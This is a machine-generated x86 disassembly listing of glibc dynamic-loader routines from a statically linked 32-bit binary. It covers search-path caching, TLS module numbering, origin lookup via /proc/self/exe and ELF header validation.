mov dword [var_sp_14h], edx
mov dword [var_sp_10h], eax
call fcn.0807b2c0
mov dword [esp], esi
call fcn.08051180
mov dword [edi], ebx
mov dword [edi + 4], 1
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, str.cannot_create_cache_for_search_path
mov dword [esp], eax
xor ecx, ecx
xor edx, edx
mov eax, 0xc
call fcn.08081200
mov edx, dword [0x80a95f4]
test edx, edx
jne 0x807b561
mov edx, dword [var_14h_2]
mov ebx, eax
movzx eax, byte [eax]
movzx edx, byte [edx]
mov byte [var_15h], dl
cmp al, byte [var_15h]
mov esi, dword [var_14h_2]
je 0x807b689
mov esi, dword [var_14h_2]
movzx edx, byte [esi]
test dl, dl
jne 0x807b641
test al, al
je 0x807b666
cmp al, 0x3a
je 0x807b666
test al, al
je 0x807b561
inc ebx
cmp al, 0x3a
je 0x807b65a
movzx eax, byte [ebx]
test al, al
jne 0x807b649
jmp 0x807b561
movzx eax, byte [ebx]
test al, al
jne 0x807b627
jmp 0x807b561
mov dword [var_4h_4], 4
mov dword [esp], 1
call fcn.08051730
test eax, eax
mov ebx, eax
jne 0x807b5e2
jmp 0x807b5f5
test al, al
je 0x807b62f
inc ebx
inc esi
movzx eax, byte [ebx]
movzx edx, byte [esi]
cmp al, dl
jne 0x807b635
test al, al
jne 0x807b68d
jmp 0x807b635
push ebp
mov dword [0x80aa850], 0
mov dword [0x80aa84c], 0x80aa854
mov ebp, esp
mov dword [ecx], 1
mov eax, 0x80aa84c
leave
ret 4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_14h], 0
mov eax, dword [var_10h_3]
lea edx, [var_4h_2]
mov dword [esp], edx
mov dword [var_4h_3], eax
call fcn.0808ddc0
test eax, eax
mov ebx, eax
je 0x807b511
mov dword [esp], ebx
call fcn.08053400
mov dword [var_10h_4], 0x80a35fc
test eax, eax
mov dword [var_18h], eax
cmove ebx, dword [var_10h_4]
cmp eax, 1
mov dword [var_10h_4], ebx
jbe 0x807b317
cmp byte [eax + ebx - 1], 0x2f
je 0x807b4f2
mov eax, dword [var_18h]
test eax, eax
je 0x807b333
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b333
mov byte [edx + eax], 0x2f
inc edx
mov dword [var_18h_2], edx
mov eax, dword [var_10h_2]
test eax, eax
jne 0x807b489
mov ebx, dword [0x80aac68]
test ebx, ebx
je 0x807b35a
mov eax, dword [var_18h_2]
cmp dword [ebx + 0x10], eax
je 0x807b44e
mov ebx, dword [ebx]
test ebx, ebx
jne 0x807b348
mov eax, dword [var_1ch_2]
xor esi, esi
test eax, eax
je 0x807b371
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [0x80aa9ec]
mov edx, dword [var_18h]
lea eax, [esi + eax*4]
lea eax, [edx + eax + 0x15]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b528
mov eax, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
lea eax, [ebx + eax*4 + 0x14]
mov dword [ebx + 0xc], eax
mov dword [var_4h_3], edx
mov eax, dword [var_18h_2]
mov dword [esp + 8], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call fcn.08053740
mov byte [eax], 0
mov ecx, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
mov eax, dword [var_18h_2]
mov dword [ebx + 0x10], eax
mov eax, dword [0x80aa9fc]
cmp dword [var_18h_2], eax
cmova eax, dword [var_18h_2]
mov dword [0x80aa9fc], eax
xor eax, eax
cmp byte [edx], 0x2f
setne al
xor edx, edx
add eax, eax
cmp edx, ecx
jae 0x807b3f9
lea esi, [esi]
mov dword [ebx + edx*4 + 0x14], eax
inc edx
cmp edx, ecx
jb 0x807b3f0
mov edi, dword [var_18h]
mov eax, dword [var_1ch]
test edi, edi
mov dword [ebx + 4], eax
je 0x807b445
mov edx, dword [var_18h_2]
lea eax, [ebx + ecx*4]
mov dword [var_ch_5], esi
lea eax, [eax + edx + 0x15]
mov edx, dword [var_18h]
mov dword [esp], eax
mov dword [var_4h_3], edx
call fcn.08053770
mov dword [ebx + 8], eax
mov eax, dword [0x80aac68]
mov dword [ebx], eax
mov dword [0x80aac68], ebx
mov eax, dword [var_14h_2]
mov edx, dword [var_ch_5]
mov dword [edx + eax*4], ebx
inc eax
mov dword [var_14h_2], eax
jmp 0x807b2d0
mov dword [ebx + 8], 0
jmp 0x807b426
mov edi, dword [ebx + 0xc]
mov esi, dword [var_10h_5]
cmp eax, eax
cld
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b354
test ebx, ebx
je 0x807b35a
xor eax, eax
cmp eax, dword [var_14h_2]
jae 0x807b47e
mov edx, dword [var_ch_5]
cmp dword [edx + eax*4], ebx
je 0x807b47e
inc eax
cmp eax, dword [var_14h_2]
jb 0x807b470
cmp eax, dword [var_14h_2]
jne 0x807b2d0
jmp 0x807b433
mov eax, dword [var_10h_4]
mov dword [var_1ch], str._lib_
mov dword [var_20h], 1
cmp byte [eax], 0x2f
jne 0x807b2d0
xor ebx, ebx
mov edx, dword [ebx*4 + 0x80a35f4]
cmp dword [var_18h], edx
mov dword [var_24h], edx
je 0x807b4d7
mov edx, dword [var_1ch]
mov eax, dword [var_24h]
inc ebx
cmp ebx, 1
lea edx, [eax + edx + 1]
mov dword [var_1ch], edx
jbe 0x807b4a5
mov eax, dword [var_20h]
test eax, eax
jne 0x807b2d0
jmp 0x807b33e
mov eax, dword [var_18h]
mov esi, dword [var_1ch]
mov edi, dword [var_10h_4]
cld
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b4b4
mov dword [var_sp_10h], 0
jmp 0x807b4c7
dec dword [var_18h_2]
cmp dword [var_18h_2], 1
jbe 0x807b317
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b4f2
jmp 0x807b317
mov eax, dword [var_14h]
mov edx, dword [var_ch_2]
mov dword [edx + eax*4], 0
lea esp, [var_ch_3]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
xor edx, edx
mov eax, 0xc
mov dword [esp], str.cannot_create_cache_for_search_path
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov esi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [esp], edx
mov dword [var_10h], eax
call fcn.08053400
mov dword [var_4h], 1
lea edx, [eax + 1]
add eax, 0x241
mov dword [var_1ch], edx
mov dword [esp], eax
call fcn.08051730
mov edi, eax
xor eax, eax
test edi, edi
je 0x807ec09
mov edx, dword [var_1ch]
lea ebx, [edi + 0x234]
lea eax, [edi + 0x240]
mov dword [edi + 0x14], ebx
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [var_14h]
mov dword [var_4h], edx
call fcn.08053770
xor ecx, ecx
mov dword [edi + 0x234], eax
mov dword [ebx + 8], 1
movzx edx, byte [var_18h]
mov eax, dword [var_10h]
mov dword [edi + 0x160], esi
mov dword [edi + 0x1b0], 4
mov dword [edi + 4], eax
and edx, 3
movzx eax, byte [edi + 0x174]
and eax, 0xfffffffc
or eax, edx
lea edx, [edi + 0x1a0]
mov byte [edi + 0x174], al
mov dword [edi + 0x1b4], edx
mov eax, dword [0x80aac58]
test eax, eax
je 0x807ec40
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807ead9
lea esi, [esi]
mov edx, eax
mov eax, dword [eax + 0xc]
test eax, eax
jne 0x807ead0
mov eax, dword [0x80aac58]
mov dword [edi + 0x10], edx
mov dword [edx + 0xc], edi
mov edx, dword [edi + 0x1b4]
add eax, 0x150
mov dword [edx + ecx*4], eax
mov ecx, 1
inc dword [0x80aabf8]
add dword [0x80aac18], 1
adc dword [0x80aac1c], 0
test esi, esi
je 0x807ec34
mov eax, dword [esi + 0x160]
test eax, eax
je 0x807eb2c
lea esi, [esi]
mov esi, eax
mov eax, dword [eax + 0x160]
test eax, eax
jne 0x807eb20
test ecx, ecx
lea eax, [esi + 0x150]
je 0x807eb3a
cmp eax, dword [edx]
je 0x807eb3d
mov dword [edx + ecx*4], eax
mov edx, dword [var_10h]
lea eax, [edi + 0x150]
mov dword [edi + 0x1b8], eax
movzx ebx, byte [edx]
test bl, bl
je 0x807ec07
mov dword [esp], edx
call fcn.08053400
inc eax
cmp bl, 0x2f
mov dword [var_20h], eax
je 0x807ec22
mov ebx, dword [var_20h]
mov dword [var_24h], 0
xor esi, esi
sub ebx, 0xffffff80
mov dword [esp], esi
mov dword [var_4h], ebx
call fcn.08051220
test eax, eax
je 0x807ebaf
mov esi, eax
mov eax, ebx
sub eax, dword [var_20h]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08079700
test eax, eax
mov dword [var_24h], eax
jne 0x807ebb6
call fcn.08048b20
cmp dword [eax], 0x22
je 0x807eb78
mov eax, dword [var_24h]
test eax, eax
je 0x807ec13
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.08076ce0
cmp byte [eax - 1], 0x2f
mov edx, eax
je 0x807ebd2
mov byte [eax], 0x2f
inc edx
mov eax, dword [var_20h]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.08053740
mov edx, eax
lea esi, [esi]
dec edx
cmp byte [edx], 0x2f
jne 0x807ebf0
lea eax, [esi + 1]
cmp edx, esi
cmove edx, eax
mov byte [edx], 0
mov dword [edi + 0x190], esi
mov eax, edi
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret 4
mov dword [esp], esi
call fcn.08051180
mov esi, 0xffffffff
jmp 0x807ec01
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
mov edx, eax
jne 0x807ebd2
jmp 0x807ec1b
mov esi, edi
jmp 0x807eb2c
nop
lea esi, [esi]
mov dword [0x80aac58], edi
jmp 0x807eaf7
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
mov esi, edx
push ebx
sub esp, 0x14
mov ebx, dword [eax + 0x14]
test ebx, ebx
je 0x807b22f
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
je 0x807b27b
mov edi, ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x807b214
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 1]
add eax, 0xd
mov dword [var_10h_2], edx
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b283
test edi, edi
je 0x807b298
mov edx, dword [var_10h_5]
lea eax, [eax + 0xc]
mov dword [var_4h_2], esi
mov dword [esp], eax
mov dword [var_ch_2], edx
call fcn.08053770
mov dword [ebx + 8], 0
mov dword [ebx + 4], 0
mov dword [ebx], eax
mov dword [edi + 4], ebx
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
mov edx, esi
mov eax, 0xc
mov dword [esp], str.cannot_allocate_name_record
call fcn.08081200
mov dword [esp + 0xc], 0x80a3689
mov dword [esp + 8], 0x162
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.lastp_____void__0_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ecx, eax
mov eax, dword [eax + 0x28]
mov ebp, esp
test eax, eax
je 0x807e949
mov eax, dword [eax + 4]
mov edx, dword [eax]
add eax, 8
mov dword [ecx + 0x168], eax
lea eax, [eax + edx*4]
mov dword [ecx + 0x164], edx
mov dword [ecx + 0x16c], eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x24
cmp byte [0x80aabe0], 0
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
jne 0x8082e75
mov ebx, dword [0x80aabd8]
lea eax, [ebx + 1]
mov dword [0x80aabd8], eax
mov edx, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov edx, dword [0x80aabe8]
mov ebx, dword [0x80aabd8]
mov dword [var_10h], 0
mov esi, dword [0x80aabdc]
inc edx
mov dword [var_14h], ebx
cmp edx, ebx
ja 0x8082f31
mov eax, edx
mov ecx, dword [esi]
sub eax, dword [var_10h]
cmp eax, ecx
jae 0x8082ec6
mov edi, dword [var_14h]
inc edi
lea esi, [esi]
mov eax, dword [esi + eax*8 + 0xc]
test eax, eax
je 0x8082ec6
inc edx
cmp edx, edi
ja 0x8082f10
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082eb0
mov eax, edx
sub eax, dword [var_10h]
cmp eax, ecx
jb 0x8082ed9
mov esi, dword [esi + 4]
add dword [var_10h], ecx
test esi, esi
jne 0x8082e9a
cmp edx, dword [var_14h]
jb 0x8082e68
jne 0x8082eec
mov byte [0x80aabe0], 0
jmp 0x8082e5e
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x5f
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result___dl_tls_max_dtv_idx
call fcn.0805efc0
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x51
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx__1
jmp 0x8082f0b
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x48
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx
jmp 0x8082f0b
mov eax, dword [0x80a95a4]
push ebp
mov dword [0x80a9ca0], 0x40
mov ebp, esp
mov dword [0x80aabd8], 1
mov dword [0x80aabdc], 0x80a9ca0
mov dword [0x80aabd0], 0x420
mov dword [0x80aabd4], 0x20
mov dword [0x80aabe8], 1
add eax, 0x43f
and eax, 0xffffffe0
mov dword [0x80a95a4], eax
xor eax, eax
leave
ret
push ebp
test eax, eax
mov ebp, esp
je 0x8083202
call fcn.08082f60
leave
jmp 0x8083050
call fcn.08082fd0
jmp 0x80831fc
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, edx
mov esi, eax
mov eax, dword [eax + 4]
sub eax, 4
mov dword [esp], eax
call fcn.08051180
test bl, bl
jne 0x8083240
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
mov eax, esi
sub eax, dword [0x80a95a4]
lea esi, [eax + 0x420]
mov dword [esp], esi
call fcn.08051180
jmp 0x8083232
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0x1000
mov ebp, esp
sub esp, 0x101c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
lea edi, [var_100ch]
mov ebx, str._proc_self_exe
mov ecx, edi
mov eax, 0x55
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8083340
test eax, eax
jle 0x8083340
movzx eax, byte [var_100ch]
cmp al, 0x5b
je 0x8083340
cmp al, 0x2f
jne 0x80833a0
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
je 0x80832f2
dec ebx
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
jne 0x80832e2
lea eax, [ebx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
cmp ebx, 1
je 0x808332d
lea eax, [ebx - 1]
mov dword [var_sp_4h], edi
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053740
mov byte [eax], 0
mov esi, esi
mov eax, esi
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
mov esi, dword [var_8h]
leave
ret
mov word [eax], 0x2f
jmp 0x8083320
mov esi, 0xffffffff
jmp 0x8083320
nop
lea esi, [esi]
mov eax, dword [0x80aac40]
mov esi, 0xffffffff
test eax, eax
je 0x8083320
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
mov eax, dword [0x80aac40]
mov dword [var_sp_8h], ebx
mov dword [esp], esi
mov dword [var_sp_4h], eax
call fcn.08053740
lea edx, [esi + 1]
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
jne 0x808331b
nop
lea esi, [esi]
dec eax
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
je 0x8083390
jmp 0x808331b
mov dword [var_sp_ch], str._dl_get_origin
invalid
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, edx
mov esi, eax
mov eax, dword [eax + 4]
sub eax, 4
mov dword [esp], eax
call fcn.08051180
test bl, bl
jne 0x8083240
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
mov eax, esi
sub eax, dword [0x80a95a4]
lea esi, [eax + 0x420]
mov dword [esp], esi
call fcn.08051180
jmp 0x8083232
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x13
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [arg_ch]
mov dword [var_4h], 0xffffffff
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_8h], eax
mov eax, dword [0x80a95c0]
mov dword [esp], eax
call fcn.08081860
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [var_8h]
mov dword [var_bp_4h], ebx
mov ebx, dword [var_18h]
cmp eax, 0xffffffff
je 0x807b97c
mov dword [esp], eax
call fcn.08053f20
test ebx, ebx
je 0x807b9a6
mov eax, dword [ebx + 0xc]
test eax, eax
jne 0x807b9cd
mov eax, dword [ebx + 0x10]
test eax, eax
jne 0x807b9c4
mov dword [0x80aac58], 0
dec dword [0x80aabf8]
mov dword [esp], ebx
call fcn.08051180
mov eax, dword [var_sp_10h]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_sp_18h]
mov edx, dword [var_ch_3]
xor ecx, ecx
mov dword [esp], eax
mov eax, dword [var_4h_3]
call fcn.08081200
mov dword [eax + 0xc], 0
jmp 0x807b998
mov dword [var_ch_2], 0x8093017
mov dword [var_8h_2], 0x30d
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.l__l_next____void__0_
call fcn.0805efc0
jmp fcn.0807ba00
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_8h]
mov dword [var_34h], 0
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08053ec0
mov dword [var_30h], eax
inc eax
je 0x807ca75
call fcn.08048b20
mov ecx, dword [var_30h]
mov edx, dword [arg_ch]
mov dword [eax], 0
mov ebx, eax
mov dword [var_8h], 0x200
add edx, 4
mov dword [esp], ecx
mov dword [var_38h], edx
mov dword [var_4h], edx
call fcn.08053f70
mov esi, dword [arg_ch]
cmp eax, 0x33
mov dword [esi], eax
jle 0x807cc80
mov esi, dword [var_38h]
mov edi, 0x80a35ff
mov ecx, 9
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807cc0b
mov esi, dword [var_38h]
cmp dword [esi + 0x14], 1
jne 0x807cc01
mov edi, dword [var_38h]
cmp word [edi + 0x12], 3
jne 0x807caf0
movzx eax, word [edi + 0x10]
cmp eax, 3
jne 0x807cbee
mov eax, dword [var_38h]
cmp word [eax + 0x2a], 0x20
jne 0x807cbe4
mov edx, dword [var_38h]
mov edi, dword [arg_ch]
movzx ecx, word [edx + 0x2c]
mov edx, dword [edx + 0x1c]
movzx ebx, cx
shl ebx, 5
lea eax, [ebx + edx]
cmp eax, dword [edi]
ja 0x807cb8f
lea edx, [edx + edi + 4]
mov dword [var_3ch], edx
mov ebx, dword [var_3ch]
movzx eax, cx
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807ca75
lea esi, [esi]
cmp dword [ebx], 4
je 0x807ca80
movzx eax, cx
add ebx, 0x20
shl eax, 5
add eax, dword [var_3ch]
cmp ebx, eax
jb 0x807ca60
mov eax, dword [var_30h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cmp dword [ebx + 0x10], 0x20
jne 0x807ca65
cmp dword [ebx + 0x1c], 3
jbe 0x807ca65
mov edx, dword [ebx + 4]
mov ecx, dword [arg_ch]
lea eax, [edx + 0x20]
cmp eax, dword [ecx]
ja 0x807cb12
lea edx, [edx + ecx + 4]
mov dword [var_40h], edx
mov esi, dword [var_40h]
mov edx, 0x80a3608
mov eax, 0x10
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807cabf
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca65
mov edx, dword [var_40h]
mov ecx, dword [var_40h]
movzx eax, byte [edx + 0x14]
mov ebx, dword [ecx + 0x10]
movzx edx, byte [edx + 0x18]
shl eax, 8
add eax, edx
movzx edx, byte [ecx + 0x1c]
shl eax, 8
add eax, edx
test ebx, ebx
jne 0x807caf0
mov edx, dword [0x80aac6c]
test edx, edx
je 0x807ca75
cmp edx, eax
jae 0x807ca75
mov esi, dword [var_30h]
mov dword [esp], esi
call fcn.08053f20
call fcn.08048b20
mov dword [eax], 2
mov dword [var_30h], 0xffffffff
jmp 0x807ca75
mov esi, dword [var_30h]
mov dword [var_8h], 0
mov eax, dword [ebx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
lea esi, [var_2ch]
call fcn.08090150
mov edi, dword [var_30h]
mov dword [var_4h], esi
mov dword [var_8h], 0x20
mov dword [esp], edi
call fcn.08053f70
cmp eax, 0x20
jne 0x807cb53
mov dword [var_40h], esi
jmp 0x807caa0
call fcn.08048b20
mov edx, str.cannot_read_file_data
mov eax, dword [eax]
mov dword [var_34h], eax
mov dword [var_14h], edx
mov edi, dword [arg_8h]
mov eax, dword [var_30h]
mov edx, dword [var_34h]
mov dword [var_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_8h], edi
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0807b960
lea eax, [ebx + 0x12]
and eax, 0x3ffffc
sub esp, eax
mov dword [var_4h], edx
lea eax, [var_27h]
mov dword [var_8h], 0
mov edx, dword [var_30h]
and eax, 0xfffffff0
mov dword [var_3ch], eax
mov dword [esp], edx
call fcn.08090150
mov esi, dword [var_30h]
mov ecx, dword [var_3ch]
mov dword [var_8h], ebx
mov dword [esp], esi
mov dword [var_4h], ecx
call fcn.08053f70
cmp eax, ebx
jne 0x807cb53
mov edi, dword [var_38h]
movzx ecx, word [edi + 0x2c]
jmp 0x807ca49
mov edx, str.ELF_files_phentsize_not_the_expected_size
jmp 0x807cb62
cmp eax, 2
mov edx, str.only_ET_DYN_and_ET_EXEC_can_be_loaded
je 0x807ca16
jmp 0x807cb62
mov edx, str.ELF_file_version_does_not_match_current_one
jmp 0x807cb62
mov ecx, dword [arg_ch]
cmp dword [ecx + 4], 0x464c457f
je 0x807cc21
mov edx, str.invalid_ELF_header
jmp 0x807cb62
mov esi, dword [var_38h]
cmp byte [esi + 4], 1
jne 0x807caf0
cmp byte [esi + 5], 1
je 0x807cc3e
mov edx, str.ELF_file_data_encoding_not_little_endian
jmp 0x807cb62
mov edi, dword [var_38h]
cmp byte [edi + 6], 1
je 0x807cc51
mov edx, str.ELF_file_version_ident_does_not_match_current_one
jmp 0x807cb62
mov eax, dword [var_38h]
cmp byte [eax + 7], 0
je 0x807cc64
mov edx, str.ELF_file_OS_ABI_invalid
jmp 0x807cb62
mov ecx, dword [var_38h]
mov edx, str.ELF_file_ABI_version_invalid
mov eax, str.internal_error
cmp byte [ecx + 8], 0
cmove edx, eax
jmp 0x807cb62
lea esi, [esi]
mov ebx, dword [ebx]
mov edx, str.file_too_short
mov eax, str.cannot_read_file_data
test ebx, ebx
mov dword [var_34h], ebx
cmovne edx, eax
jmp 0x807cb62
push ebp
mov ebp, esp
sub esp, 0x5c
mov eax, dword [0x80aad2c]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test eax, eax
jne 0x8079684
call fcn.08048b20
mov ecx, esi
mov dword [var_50h], eax
mov edi, dword [eax]
mov eax, 0xc3
int 0x80
cmp eax, 0xfffff000
ja 0x80796c6
cmp eax, 0xffffffff
mov edx, eax
je 0x807966d
test edx, edx
jne 0x8079660
mov eax, dword [esi + 0x58]
cmp dword [esi + 0xc], eax
je 0x8079660
mov eax, dword [esi + 0xc]
mov dword [esi + 0x5c], 0
mov dword [esi + 0x58], eax
lea esi, [esi]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_50h]
cmp dword [ecx], 0x26
jne 0x8079643
mov edx, dword [var_50h]
mov dword [edx], edi
mov dword [0x80aad2c], 1
lea edi, [var_4ch]
mov ecx, edi
mov eax, 0x6a
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80796b6
test ebx, ebx
mov edx, ebx
jne 0x8079660
mov eax, dword [arg_8h]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], edi
mov dword [esp], eax
call fcn.08054430
mov edx, eax
jmp 0x8079660
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079699
mov edx, dword [var_50h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x807963c
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov dword [var_14h], 1
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
mov edi, dword [arg_8h]
mov dword [var_10h], esp
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov dword [esp], str._search_path
lea esi, [var_1bh]
call fcn.08081c40
mov eax, dword [edi]
and esi, 0xfffffff0
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
mov eax, dword [var_14h]
test eax, eax
je 0x807c897
mov eax, dword [var_14h]
cmp byte [eax], 0
jne 0x807c892
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
mov edx, dword [var_ch]
mov dword [esp], str._t_t__s_from_file__s__n
mov dword [var_4h], edx
call fcn.08081c70
mov esp, dword [var_10h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
jmp 0x807c870
mov eax, dword [var_ch]
mov dword [esp], str._t_t__s__n
mov dword [var_4h], eax
call fcn.08081c70
jmp 0x807c887
mov eax, dword [eax + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [edi]
mov eax, dword [eax + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08053740
mov edx, dword [0x80aa9ec]
mov dword [var_18h], eax
cmp ebx, edx
jae 0x807c941
mov eax, dword [edi]
cmp dword [eax + ebx*4 + 0x14], 1
je 0x807c93c
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [0x80aa9e8]
mov eax, dword [eax + ebx*8]
mov dword [var_4h], eax
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053740
cmp eax, esi
mov edx, eax
je 0x807c964
lea eax, [esi + 1]
cmp edx, eax
je 0x807c95f
mov byte [edx - 1], 0
mov dword [var_4h], esi
mov eax, 0x80a37bd
mov edx, 0x80a37be
mov ecx, dword [var_14h_2]
test ecx, ecx
cmove edx, eax
mov dword [esp], edx
call fcn.08081c70
mov dword [var_14h_2], 0
mov edx, dword [0x80aa9ec]
inc ebx
cmp ebx, edx
jb 0x807c8d3
add edi, 4
mov eax, dword [edi]
test eax, eax
je 0x807c85a
mov edx, dword [var_ch]
cmp dword [eax + 4], edx
je 0x807c8ac
jmp 0x807c85a
cmp byte [esi], 0x2f
jne 0x807c90d
mov byte [edx], 0
jmp 0x807c911
push ebp
mov ebp, esp
push esi
mov esi, eax
push ebx
mov ebx, edx
sub esp, 8
mov eax, dword [edx + 4]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 0x14]
test ebx, ebx
je 0x8081d1e
nop
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x8081d20
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8081d00
xor edx, edx
add esp, 8
mov eax, edx
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
lea eax, [var_6ch]
push ebx
sub esp, 0xf0
mov dword [var_94h], 0
mov dword [var_80h], 0
mov edi, dword [var_ch_2]
mov dword [var_8h_3], eax
mov eax, dword [var_8h_2]
mov dword [esp], 3
mov dword [var_4h_3], eax
call fcn.08053dc0
test eax, eax
js 0x807c7f9
mov edx, dword [0x80aac58]
test edx, edx
mov dword [var_80h], edx
je 0x807bab2
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ebx, dword [var_14h_3]
mov esi, dword [var_10h_3]
mov dword [var_9ch], eax
